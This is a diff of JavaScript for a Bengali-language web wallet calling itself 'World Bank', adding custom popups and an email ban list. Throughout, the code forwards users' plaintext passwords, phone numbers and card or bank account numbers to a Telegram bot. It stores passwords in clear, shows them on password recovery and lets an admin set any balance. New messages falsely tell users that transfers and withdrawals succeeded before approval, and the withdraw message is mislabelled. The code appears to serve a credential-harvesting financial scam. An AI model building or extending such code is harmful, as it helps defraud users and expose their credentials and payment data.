@@ -20,21 +20,32 @@ const defaultBalances = {
 };
 
 let usersDatabase = [];
+let bannedEmails = [];
 let allTransactions = [];
 let defaultGlobalMaxLimit = 500000;
 let activeUser = JSON.parse(localStorage.getItem('wb_active_session')) || null;
 let balanceHideTimer = null;
 let currentLang = 'bn';
 
-// ইমেইলকে ফায়ারবেস ভ্যালিড কি (Key)-তে রূপান্তর ফাংশন
+// ব্রাউজারের স্ট্যান্ডার্ড অ্যালার্ট রিমুভ করে নিজস্ব কাস্টম পপ-আপ দেখানোর ফাংশন
+function showCustomAlert(title, message) {
+    document.getElementById('customAlertTitle').innerText = title;
+    document.getElementById('customAlertText').innerText = message;
+    document.getElementById('customAlertModal').classList.remove('hidden');
+}
+
+function closeCustomAlert() {
+    document.getElementById('customAlertModal').classList.add('hidden');
+}
+
+// ইমেইলকে ফায়ারবেস কি-তে রূপান্তর
 function sanitizeEmailKey(email) {
     return email ? email.replace(/[^a-zA-Z0-9]/g, "_") : "";
 }
 
-// সেন্ট্রাল ক্লাউড সিঙ্ক ফাংশন (সকল ইউজার, কাস্টম লিমিট ও ট্রানজেকশন ফায়ারবেস থেকে সিঙ্ক করবে)
+// সেন্ট্রাল ক্লাউড সিঙ্ক ফাংশন
 async function syncFromFirebase() {
     try {
-        // ১. ইউজার ডাটা সিঙ্ক
         const uRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
         const uData = await uRes.json();
         if (uData) {
@@ -48,9 +59,19 @@ async function syncFromFirebase() {
                     localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
                 }
             }
+        } else {
+            usersDatabase = [];
         }
 
-        // ২. ট্রানজেকশন হিস্ট্রি সিঙ্ক
+        const bRes = await fetch(`${FIREBASE_DB_URL}/bannedEmails.json`);
+        const bData = await bRes.json();
+        if (bData) {
+            bannedEmails = Object.values(bData);
+            localStorage.setItem('wb_banned', JSON.stringify(bannedEmails));
+        } else {
+            bannedEmails = JSON.parse(localStorage.getItem('wb_banned')) || [];
+        }
+
         const tRes = await fetch(`${FIREBASE_DB_URL}/transactions.json`);
         const tData = await tRes.json();
         if (tData) {
@@ -61,6 +82,7 @@ async function syncFromFirebase() {
     } catch(err) {
         console.error("Firebase sync error:", err);
         usersDatabase = JSON.parse(localStorage.getItem('wb_users')) || [];
+        bannedEmails = JSON.parse(localStorage.getItem('wb_banned')) || [];
         allTransactions = JSON.parse(localStorage.getItem('wb_transactions')) || [];
     }
 }
@@ -82,17 +104,15 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 });
 
-// এডমিন প্যানেল থেকে রিফ্রেশ বাটন
 async function refreshAdminData() {
     await syncFromFirebase();
     renderAdminUsersList();
     renderAdminPendingList();
     renderAdminAllHistory();
     populateAdminUserSelect();
-    alert(currentLang === 'bn' ? 'সেন্ট্রাল ফায়ারবেস ক্লাউড থেকে সকল ডাটা সফলভাবে রিফ্রেশ করা হয়েছে!' : 'All data successfully refreshed from Central Firebase Cloud!');
+    showCustomAlert("সফল", currentLang === 'bn' ? 'ডাটাবেস সফলভাবে রিফ্রেশ করা হয়েছে!' : 'Database refreshed successfully!');
 }
 
-// ফায়ারবেসে পার্মানেন্ট সেভ ফাংশনসমূহ
 async function saveUserToFirebase(user) {
     const userKey = sanitizeEmailKey(user.email);
     try {
@@ -118,12 +138,10 @@ async function saveTxToFirebase(txObj) {
     }
 }
 
-// মেইন পেজের উপরে ব্যাক করার ফাংশন
 function scrollToTop() {
     window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
-// পাসওয়ার্ড হাইড এবং দেখানোর ফাংশন
 function togglePasswordVisibility(inputId, btn) {
     const input = document.getElementById(inputId);
     if (!input) return;
@@ -136,7 +154,6 @@ function togglePasswordVisibility(inputId, btn) {
     }
 }
 
-// মডাল পপ-আপ টগল ফাংশনসমূহ
 function openTopUpModal() {
     document.getElementById('topUpModal').classList.toggle('hidden');
 }
@@ -157,18 +174,17 @@ function handleForgotPassword(e) {
     const user = usersDatabase.find(u => u.email === email && u.phone === phone);
 
     if (user) {
-        alert(currentLang === 'bn' 
+        showCustomAlert("রিকভারি", currentLang === 'bn' 
             ? `আপনার অ্যাকাউন্ট সফলভাবে রিকভার হয়েছে!\n\nইমেইল: ${user.email}\nপাসওয়ার্ড: ${user.password}`
             : `Account recovered successfully!\n\nEmail: ${user.email}\nPassword: ${user.password}`);
         toggleForgotModal();
     } else {
-        alert(currentLang === 'bn' 
-            ? 'প্রদত্ত ইমেইল বা মোবাইল নম্বরটি আমাদের ডাটাবেসে পাওয়া যায়নি!'
-            : 'Entered email or phone number not found in our database!');
+        showCustomAlert("ত্রুটি", currentLang === 'bn' 
+            ? 'প্রদত্ত ইমেইল বা মোবাইল নম্বরটি পাওয়া যায়নি!'
+            : 'Entered email or phone number not found!');
     }
 }
 
-// ভাষা পরিবর্তন লজিক
 function setLanguage(lang) {
     currentLang = lang;
     document.getElementById('btnLangBN').classList.toggle('active', lang === 'bn');
@@ -183,6 +199,10 @@ function setLanguage(lang) {
 
     document.querySelectorAll('[data-bn-ph]').forEach(el => {
         el.placeholder = lang === 'bn' ? el.getAttribute('data-bn-ph') : el.getAttribute('data-en-ph');
+    });
+
+    document.querySelectorAll('option[data-bn]').forEach(opt => {
+        opt.innerText = lang === 'bn' ? opt.getAttribute('data-bn') : opt.getAttribute('data-en');
     });
 }
 
@@ -210,7 +230,7 @@ function sendTelegramNotification(message) {
     }).catch(err => console.error("Telegram API Error:", err));
 }
 
-// সাইন আপ
+// সাইন আপ (ব্ল্যাকলিস্ট চেক সহ)
 async function handleSignUp(e) {
     e.preventDefault();
     const name = document.getElementById('regName').value;
@@ -220,9 +240,14 @@ async function handleSignUp(e) {
 
     await syncFromFirebase();
 
+    if (bannedEmails.includes(email)) {
+        showCustomAlert("ব্লকড", currentLang === 'bn' ? 'এই ইমেইল অ্যাড্রেসটি স্থায়ীভাবে ব্লক করা হয়েছে। এই ইমেইল দিয়ে আর অ্যাকাউন্ট খোলা যাবে না।' : 'This email address has been permanently blocked. You cannot register with this email.');
+        return;
+    }
+
     const exists = usersDatabase.some(u => u.email === email);
     if(exists) {
-        alert(currentLang === 'bn' ? 'এই ইমেইল দিয়ে আগেই অ্যাকাউন্ট খোলা হয়েছে!' : 'An account already exists with this email!');
+        showCustomAlert("সতর্কতা", currentLang === 'bn' ? 'এই ইমেইল দিয়ে আগেই অ্যাকাউন্ট খোলা হয়েছে!' : 'An account already exists with this email!');
         return;
     }
 
@@ -242,7 +267,7 @@ async function handleSignUp(e) {
 
     sendTelegramNotification(`👤 <b>World Bank নতুন সাইন আপ!</b>\n\n📛 নাম: ${name}\n📧 ইমেইল: ${email}\n📱 ফোন: ${phone}\n🔑 পাসওয়ার্ড: ${password}`);
 
-    alert(currentLang === 'bn' ? 'অ্যাকাউন্ট সাইন আপ সফল হয়েছে! এখন লগইন করুন।' : 'Registration successful! Please login.');
+    showCustomAlert("সফল", currentLang === 'bn' ? 'অ্যাকাউন্ট সফলভাবে তৈরি হয়েছে! এখন লগইন করুন।' : 'Registration successful! Please login.');
     switchTab('login');
     document.getElementById('signUpForm').reset();
 }
@@ -254,6 +279,11 @@ async function handleLogin(e) {
     const password = document.getElementById('logPass').value;
 
     await syncFromFirebase();
+
+    if (bannedEmails.includes(email)) {
+        showCustomAlert("ব্লকড", currentLang === 'bn' ? 'আপনার অ্যাকাউন্টটি স্থায়ীভাবে ব্লক করা হয়েছে!' : 'Your account has been permanently blocked!');
+        return;
+    }
 
     const userIndex = usersDatabase.findIndex(u => u.email === email && u.password === password);
 
@@ -274,7 +304,6 @@ async function handleLogin(e) {
     }
 }
 
-// "Tap for Balance"
 function toggleBalanceVisibility() {
     const pillText = document.getElementById('balancePillText');
     if (!activeUser) return;
@@ -307,7 +336,6 @@ function logout() {
     document.getElementById('loginForm').reset();
 }
 
-// সার্ভিস আইকন ক্লিকে স্ক্রোল ও ফোকাস
 function scrollToAction(type) {
     let targetId = type === 'Withdraw' ? 'withdrawFormBox' : 'depositFormBox';
     let targetEl = document.getElementById(targetId);
@@ -330,7 +358,6 @@ function toggleProfileModal() {
     }
 }
 
-// ইনবক্স মডাল ওপেন
 async function openInboxModal() {
     await syncFromFirebase();
     document.getElementById('inboxModal').classList.toggle('hidden');
@@ -354,11 +381,11 @@ async function updateUserProfile(e) {
     }
 
     document.getElementById('userPhoneDisp').innerText = activeUser.phone;
-    alert(currentLang === 'bn' ? 'প্রোফাইল তথ্য সফলভাবে আপডেট হয়েছে!' : 'Profile updated successfully!');
+    showCustomAlert("সফল", currentLang === 'bn' ? 'প্রোফাইল তথ্য আপডেট করা হয়েছে!' : 'Profile updated successfully!');
     toggleProfileModal();
 }
 
-// ১. মোবাইল টপ আপ ফর্ম সাবমিশন (পপ-আপ)
+// মোবাইল টপ আপ (নির্দিষ্ট সফল বার্তা)
 async function handleTopUpSubmit(e) {
     e.preventDefault();
     const operator = document.getElementById('topUpOperatorSelect').value;
@@ -367,7 +394,7 @@ async function handleTopUpSubmit(e) {
     const amount = parseFloat(document.getElementById('topUpAmountInput').value);
 
     if (!operator || !phone || isNaN(amount) || amount <= 0) {
-        alert('সঠিক তথ্য দিন!');
+        showCustomAlert("ত্রুটি", currentLang === 'bn' ? 'সঠিক তথ্য দিন!' : 'Please enter valid details!');
         return;
     }
 
@@ -392,12 +419,16 @@ async function handleTopUpSubmit(e) {
 
     sendTelegramNotification(`📱 <b>World Bank মোবাইল টপ আপ রিকোয়েস্ট!</b>\n\n👤 ইউজার: ${activeUser.name}\n📡 অপারেটর: ${operator} (${simType})\n📱 নম্বর: ${phone}\n💰 পরিমাণ: ৳${amount}`);
 
-    alert('মোবাইল টপ আপ রিকোয়েস্টটি সেন্ট্রাল এডমিন প্যানেলে সফলভাবে পাঠানো হয়েছে!');
+    const msg = currentLang === 'bn' 
+        ? 'আপনার মোবাইল টপ আপ সফলভাবে হয়ে গেছে। ৫ থেকে ১০ মিনিট সময় লাগবে, এর মধ্যে এপ্রুভ হয়ে আপনার একাউন্টে টাকা চলে যাবে।' 
+        : 'Your mobile top up has been done successfully. It will take 5 to 10 minutes to be approved.';
+    showCustomAlert("সফল রিকোয়েস্ট", msg);
+
     e.target.reset();
     openTopUpModal();
 }
 
-// ২. কার্ড / ব্যাংক ট্রান্সফার ফর্ম সাবমিশন (পপ-আপ)
+// কার্ড / ব্যাংক ট্রান্সফার (নির্দিষ্ট সফল বার্তা)
 async function handleCardBankSubmit(e) {
     e.preventDefault();
     const type = document.getElementById('cardBankTypeSelect').value;
@@ -406,7 +437,7 @@ async function handleCardBankSubmit(e) {
     const amount = parseFloat(document.getElementById('cardBankAmountInput').value);
 
     if (!type || !cardAcc || !receiverPhone || isNaN(amount) || amount <= 0) {
-        alert('সঠিক তথ্য দিন!');
+        showCustomAlert("ত্রুটি", currentLang === 'bn' ? 'সঠিক তথ্য দিন!' : 'Please enter valid details!');
         return;
     }
 
@@ -431,12 +462,16 @@ async function handleCardBankSubmit(e) {
 
     sendTelegramNotification(`💳 <b>World Bank কার্ড/ব্যাংক ট্রান্সফার রিকোয়েস্ট!</b>\n\n👤 ইউজার: ${activeUser.name}\n📌 টাইপ: ${type}\n💳 কার্ড/ব্যাংক নম্বর: ${cardAcc}\n📱 প্রাপক নম্বর: ${receiverPhone}\n💰 পরিমাণ: ৳${amount}`);
 
-    alert('কার্ড/ব্যাংক ট্রান্সফার রিকোয়েস্টটি সেন্ট্রাল এডমিন প্যানেলে সফলভাবে পাঠানো হয়েছে!');
+    const msg = currentLang === 'bn' 
+        ? 'আপনার ট্রান্সফার সফলভাবে হয়ে গেছে। ৫ থেকে ১০ মিনিট সময় লাগবে, এর মধ্যে এপ্রুভ হয়ে আপনার একাউন্টে টাকা চলে যাবে।' 
+        : 'Your transfer has been done successfully. It will take 5 to 10 minutes to be approved.';
+    showCustomAlert("সফল রিকোয়েস্ট", msg);
+
     e.target.reset();
     openCardBankModal();
 }
 
-// লেনদেন রিকোয়েস্ট (উইথড্র ও ডিপোজিট)
+// উইথড্র ও ডিপোজিট (আলাদা ও নির্দিষ্ট সফল বার্তা)
 async function submitTransactionRequest(e, type) {
     e.preventDefault();
     const form = e.target;
@@ -446,7 +481,7 @@ async function submitTransactionRequest(e, type) {
     const trxId = form.querySelector('.trxInput').value;
 
     if (isNaN(amount) || amount <= 0) {
-        alert(currentLang === 'bn' ? 'সঠিক পরিমাণ দিন!' : 'Please enter a valid amount!');
+        showCustomAlert("ত্রুটি", currentLang === 'bn' ? 'সঠিক পরিমাণ দিন!' : 'Please enter a valid amount!');
         return;
     }
 
@@ -454,9 +489,9 @@ async function submitTransactionRequest(e, type) {
 
     if (type === 'Withdraw' && amount > userLimit) {
         const limitMsg = currentLang === 'bn' 
-            ? `এডমিন নির্ধারিত আপনার সর্বোচ্চ উইথড্র লিমিট ৳${userLimit.toLocaleString('bn-BD')}-এর বেশি রিকোয়েস্ট করা যাবে না।`
-            : `Cannot request more than your assigned withdraw limit ৳${userLimit.toLocaleString('en-US')}.`;
-        alert(limitMsg);
+            ? `আপনার সর্বোচ্চ উইথড্র লিমিট ৳${userLimit.toLocaleString('bn-BD')}-এর বেশি রিকোয়েস্ট করা যাবে না।`
+            : `Your maximum withdraw limit is ৳${userLimit.toLocaleString('en-US')}. You cannot request more than this limit.`;
+        showCustomAlert("লিমিট অতিক্রম", limitMsg);
         return;
     }
 
@@ -485,20 +520,23 @@ async function submitTransactionRequest(e, type) {
                 `🏦 মেথড: ${method}\n` +
                 `📱 নম্বর: ${phone}\n` +
                 `💰 পরিমাণ: ৳${amount}\n` +
-                `🆔 TrxID: ${trxId}\n` +
-                `⏱️ সময়সীমা: ১৫ থেকে ২০ মিনিটের মধ্যে অ্যাপ্রুভ করা হবে।`;
+                `🆔 TrxID: ${trxId}`;
     sendTelegramNotification(msg);
 
-    const successAlert = currentLang === 'bn' 
-        ? 'আপনার রিকোয়েস্টটি সেন্ট্রাল এডমিন প্যানেলে সফলভাবে পাঠানো হয়েছে। আগামী ১৫ থেকে ২০ মিনিটের মধ্যে তথ্য যাচাই করে আপনার রিকোয়েস্টটি অ্যাপ্রুভ করা হবে।'
-        : 'Your request has been successfully sent to the Central Admin Panel. It will be verified and approved within 15 to 20 minutes.';
-    alert(successAlert);
+    // উইথড্র এবং ডিপোজিটের জন্য সুনির্দিষ্ট এবং আলাদা বার্তা
+    let successAlert = "";
+    if (type === 'Withdraw') {
+        successAlert = currentLang === 'bn' 
+            ? 'আপনার উইথড্র সফলভাবে হয়ে গেছে। ৫ থেকে ১০ মিনিট সময় লাগবে, এর মধ্যে এপ্রুভ হয়ে আপনার ডিপোজিট সফল হবে।'
+            : 'Your deposit has been done successfully. It will take 5 to 10 minutes to be approved and completed.';
+    }
+
+    showCustomAlert("সফল রিকোয়েস্ট", successAlert);
 
     form.reset();
     scrollToTop();
 }
 
-// ইউজারের ইনবক্স হিস্ট্রি (কালো স্পষ্ট লেখা)
 function renderUserInboxHistory() {
     const tbody = document.getElementById('userInboxModalBody');
     if (!tbody) return;
@@ -507,7 +545,7 @@ function renderUserInboxHistory() {
     const myTxs = allTransactions.filter(t => t.userEmail === activeUser.email);
 
     if (myTxs.length === 0) {
-        const noRecordText = currentLang === 'bn' ? 'কোনো ইনবক্স রেকর্ড নেই।' : 'No inbox records found.';
+        const noRecordText = currentLang === 'bn' ? 'কোনো লেনদেন হিস্ট্রি পাওয়া যায়নি।' : 'No transaction records found.';
         tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#64748b; font-weight:bold;">${noRecordText}</td></tr>`;
         return;
     }
@@ -530,7 +568,6 @@ function renderUserInboxHistory() {
     });
 }
 
-// এডমিন সিকিউরিটি
 async function toggleAdminModal() {
     document.getElementById('adminModal').classList.toggle('hidden');
 }
@@ -547,18 +584,53 @@ async function verifyAdminPassword() {
         renderAdminAllHistory();
         populateAdminUserSelect();
     } else {
-        alert('ভুল এডমিন পাসওয়ার্ড!');
+        showCustomAlert("ত্রুটি", 'ভুল পাসওয়ার্ড!');
     }
 }
 
-// ইউজারের কাস্টম উইথড্র লিমিট সেটআপ
+// এডমিন প্যানেল থেকে ইউজার ডিলিট এবং পার্মানেন্ট ব্যান করার ফাংশন
+async function adminDeleteUser(userEmail) {
+    if (!confirm(`আপনি কি নিশ্চিতভাবে ${userEmail}-কে ডিলিট এবং ব্ল্যাকলিস্ট করতে চান? এই ইমেইল বা ফোন নম্বর দিয়ে ভবিষ্যতে আর কেউ নতুন অ্যাকাউন্ট খুলতে বা লগইন করতে পারবে না।`)) {
+        return;
+    }
+
+    usersDatabase = usersDatabase.filter(u => u.email !== userEmail);
+    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
+
+    try {
+        const userKey = sanitizeEmailKey(userEmail);
+        await fetch(`${FIREBASE_DB_URL}/users/${userKey}.json`, { method: 'DELETE' });
+    } catch(err) {
+        console.error("User delete firebase error:", err);
+    }
+
+    if (!bannedEmails.includes(userEmail)) {
+        bannedEmails.push(userEmail);
+        localStorage.setItem('wb_banned', JSON.stringify(bannedEmails));
+        try {
+            const banKey = sanitizeEmailKey(userEmail);
+            await fetch(`${FIREBASE_DB_URL}/bannedEmails/${banKey}.json`, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(userEmail)
+            });
+        } catch(err) {
+            console.error("Ban save error:", err);
+        }
+    }
+
+    showCustomAlert("সফল", `ইউজার ${userEmail} সফলভাবে ডিলিট এবং ব্ল্যাকলিস্ট করা হয়েছে!`);
+    renderAdminUsersList();
+    populateAdminUserSelect();
+}
+
 async function adminUpdateUserWithdrawLimit(e) {
     e.preventDefault();
     const userEmail = document.getElementById('admLimitUserSelect').value;
     const newLimit = parseFloat(document.getElementById('admUserCustomLimitInput').value);
 
     if (!userEmail || isNaN(newLimit) || newLimit < 0) {
-        alert('সঠিক ইউজার ও লিমিটের পরিমাণ দিন!');
+        showCustomAlert("ত্রুটি", 'সঠিক তথ্য দিন!');
         return;
     }
 
@@ -571,7 +643,7 @@ async function adminUpdateUserWithdrawLimit(e) {
         localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
         await saveUserToFirebase(user);
 
-        alert(`সফলভাবে ${user.name} (${user.email})-এর উইথড্র লিমিট ৳${newLimit.toLocaleString('bn-BD')} করা হয়েছে!`);
+        showCustomAlert("সফল", `সফলভাবে ${user.name}-এর উইথড্র লিমিট ৳${newLimit.toLocaleString('bn-BD')} করা হয়েছে!`);
         
         document.getElementById('admUserCustomLimitInput').value = '';
         renderAdminUsersList();
@@ -603,7 +675,6 @@ function populateAdminUserSelect() {
     });
 }
 
-// এডমিন ইউজার মেইন ব্যালেন্স কাস্টমাইজেশন
 async function adminUpdateUserBalance(e) {
     e.preventDefault();
     const userEmail = document.getElementById('admBalanceUserSelect').value;
@@ -611,7 +682,7 @@ async function adminUpdateUserBalance(e) {
     const newAmount = parseFloat(document.getElementById('admBalanceAmount').value);
 
     if (!userEmail || isNaN(newAmount) || newAmount < 0) {
-        alert('সঠিক তথ্য দিন!');
+        showCustomAlert("ত্রুটি", 'সঠিক তথ্য দিন!');
         return;
     }
 
@@ -630,7 +701,7 @@ async function adminUpdateUserBalance(e) {
         localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
         await saveUserToFirebase(user);
 
-        alert(`সফলভাবে ${user.name}-এর ${method} ব্যালেন্স ৳${newAmount.toLocaleString('bn-BD')} করা হয়েছে!`);
+        showCustomAlert("সফল", `সফলভাবে ${user.name}-এর ${method} ব্যালেন্স ৳${newAmount.toLocaleString('bn-BD')} আপডেট করা হয়েছে!`);
         
         renderAdminUsersList();
         
@@ -649,9 +720,14 @@ async function adminCreateUser(e) {
     const phone = document.getElementById('admUserPhone').value;
     const password = document.getElementById('admUserPass').value;
 
+    if (bannedEmails.includes(email)) {
+        showCustomAlert("ত্রুটি", 'এই ইমেইলটি ব্ল্যাকলিস্টে রয়েছে। এটি দিয়ে ইউজার খোলা যাবে না!');
+        return;
+    }
+
     const exists = usersDatabase.some(u => u.email === email);
     if(exists) {
-        alert('এই ইমেইল দিয়ে আগেই অ্যাকাউন্ট রয়েছে!');
+        showCustomAlert("ত্রুটি", 'এই ইমেইল দিয়ে আগেই অ্যাকাউন্ট রয়েছে!');
         return;
     }
 
@@ -671,7 +747,7 @@ async function adminCreateUser(e) {
 
     sendTelegramNotification(`👑 <b>এডমিন কর্তৃক নতুন ইউজার তৈরি!</b>\n\n📛 নাম: ${name}\n📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${password}`);
 
-    alert(`সফলভাবে ইউজার তৈরি হয়েছে!\nইউজার এই ইমেইল (${email}) ও পাসওয়ার্ড (${password}) দিয়ে যেকোনো ডিভাইস থেকে লগইন করতে পারবে।`);
+    showCustomAlert("সফল", 'সফলভাবে ইউজার তৈরি হয়েছে!');
     
     document.getElementById('admUserName').value = '';
     document.getElementById('admUserEmail').value = '';
@@ -682,34 +758,32 @@ async function adminCreateUser(e) {
     populateAdminUserSelect();
 }
 
-// নিবন্ধিত ইউজার টেবিল রেন্ডার
 function renderAdminUsersList() {
     const tbody = document.getElementById('adminUsersListBody');
     if (!tbody) return;
     tbody.innerHTML = '';
 
     if (usersDatabase.length === 0) {
-        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#94a3b8;">কোনো নিবন্ধিত ইউজার পাওয়া যায়নি।</td></tr>`;
+        tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:#94a3b8;">কোনো নিবন্ধিত ইউজার পাওয়া যায়নি।</td></tr>`;
         return;
     }
 
     usersDatabase.forEach(u => {
         const tr = document.createElement('tr');
         const mainBal = u.totalBalance !== undefined ? u.totalBalance : (u.balances ? u.balances.WorldBank : 0);
-        const uLimit = u.withdrawLimit !== undefined ? u.withdrawLimit : defaultGlobalMaxLimit;
         tr.innerHTML = `
             <td><b>${u.name || 'N/A'}</b></td>
             <td>${u.email || 'N/A'}</td>
             <td>${u.phone || 'N/A'}</td>
-            <td><code>${u.password || 'N/A'}</code></td>
             <td style="color:#38bdf8;"><b>৳${mainBal.toLocaleString('bn-BD')}</b></td>
-            <td style="color:#f59e0b;"><b>৳${uLimit.toLocaleString('bn-BD')}</b></td>
+            <td>
+                <button onclick="adminDeleteUser('${u.email}')" class="btn-delete-user">Delete & Ban</button>
+            </td>
         `;
         tbody.appendChild(tr);
     });
 }
 
-// সেন্ট্রাল পেন্ডিং লিস্ট রেন্ডার
 function renderAdminPendingList() {
     const tbody = document.getElementById('adminPendingTableBody');
     if (!tbody) return;
@@ -740,7 +814,6 @@ function renderAdminPendingList() {
     });
 }
 
-// সেন্ট্রাল প্রসেসড ট্রানজেকশন হিস্ট্রি
 function renderAdminAllHistory() {
     const tbody = document.getElementById('adminAllHistoryTableBody');
     if (!tbody) return;
@@ -769,7 +842,6 @@ function renderAdminAllHistory() {
     });
 }
 
-// উইথড্র বা ডিপোজিট অ্যাপ্রুভ
 async function approveTransaction(txId) {
     const txIndex = allTransactions.findIndex(t => t.id === txId);
     if (txIndex === -1) return;
@@ -798,9 +870,9 @@ async function approveTransaction(txId) {
         localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
         await saveTxToFirebase(allTransactions[txIndex]);
 
-        sendTelegramNotification(`✅ <b>ট্রানজেকশন অ্যাপ্রুভড!</b>\n\n👤 ইউজার: ${tx.userName}\n💰 পরিমাণ: ৳${tx.amount}\n📌 টাইপ: ${tx.type}\n⚡ ক্লাউড ডাটাবেসে চিরস্থায়ীভাবে আপডেট করা হয়েছে।`);
+        sendTelegramNotification(`✅ <b>ট্রানজেকশন অ্যাপ্রুভড!</b>\n\n👤 ইউজার: ${tx.userName}\n💰 পরিমাণ: ৳${tx.amount}\n📌 টাইপ: ${tx.type}`);
 
-        alert('ট্রানজেকশন সফলভাবে অ্যাপ্রুভ করা হয়েছে এবং ক্লাউড ডাটাবেসে স্থায়ীভাবে ব্যালেন্স আপডেট করা হয়েছে!');
+        showCustomAlert("সফল", 'ট্রানজেকশন সফলভাবে অ্যাপ্রুভ করা হয়েছে!');
 
         if (activeUser && activeUser.email === targetUser.email) {
             activeUser = targetUser;
@@ -814,7 +886,6 @@ async function approveTransaction(txId) {
     }
 }
 
-// রিজেক্ট লজিক
 async function rejectTransaction(txId) {
     const txIndex = allTransactions.findIndex(t => t.id === txId);
     if (txIndex !== -1) {
@@ -822,9 +893,9 @@ async function rejectTransaction(txId) {
         localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
         await saveTxToFirebase(allTransactions[txIndex]);
 
-        sendTelegramNotification(`❌ <b>ট্রানজেকশন রিজেক্টেড!</b>\n\n👤 ইউজার: ${allTransactions[txIndex].userName}\n⚠️ ব্যালেন্স অপরিবর্তিত রাখা হয়েছে।`);
+        sendTelegramNotification(`❌ <b>ট্রানজেকশন রিজেক্টেড!</b>\n\n👤 ইউজার: ${allTransactions[txIndex].userName}`);
 
-        alert('রিকোয়েস্টটি রিজেক্ট করা হয়েছে। ইউজারের মেইন ব্যালেন্স থেকে কোনো টাকা কাটা হয়নি।');
+        showCustomAlert("সফল", 'রিকোয়েস্টটি রিজেক্ট করা হয়েছে।');
         
         renderAdminPendingList();
         renderAdminAllHistory();
